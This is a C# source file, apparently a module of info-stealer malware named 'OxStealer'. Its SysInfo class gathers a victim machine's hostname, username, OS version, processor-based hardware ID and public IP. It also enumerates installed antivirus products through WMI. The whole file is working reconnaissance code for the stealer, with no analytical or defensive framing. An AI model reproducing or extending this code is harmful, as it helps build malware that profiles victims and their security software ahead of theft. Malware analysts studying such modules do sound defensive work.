using System;
using System.Collections.Generic;
using System.Management;
using System.Net.Http;

namespace OxStealer.Modules
{
    internal static class SysInfo
    {
        public static Dictionary<string, object> Collect()
        {
            var d = new Dictionary<string, object>
            {
                ["hostname"] = Environment.MachineName,
                ["user"] = Environment.UserName,
                ["os"] = Environment.OSVersion.ToString(),
                ["hwid"] = GetHwid(),
                ["ip_public"] = GetPublicIp(),
                ["av"] = GetAv(),
            };
            return d;
        }

        static string GetHwid()
        {
            try
            {
                using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
                foreach (var obj in searcher.Get())
                    return obj["ProcessorId"]?.ToString() ?? "";
            }
            catch { }
            return "";
        }

        static string GetPublicIp()
        {
            try
            {
                using var client = new HttpClient();
                return client.GetStringAsync("https://api.ipify.org").Result;
            }
            catch { return ""; }
        }

        static string GetAv()
        {
            try
            {
                using var searcher = new ManagementObjectSearcher(
                    @"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                var names = new List<string>();
                foreach (var obj in searcher.Get())
                    names.Add(obj["displayName"]?.ToString() ?? "");
                return string.Join(", ", names);
            }
            catch { return ""; }
        }
    }
}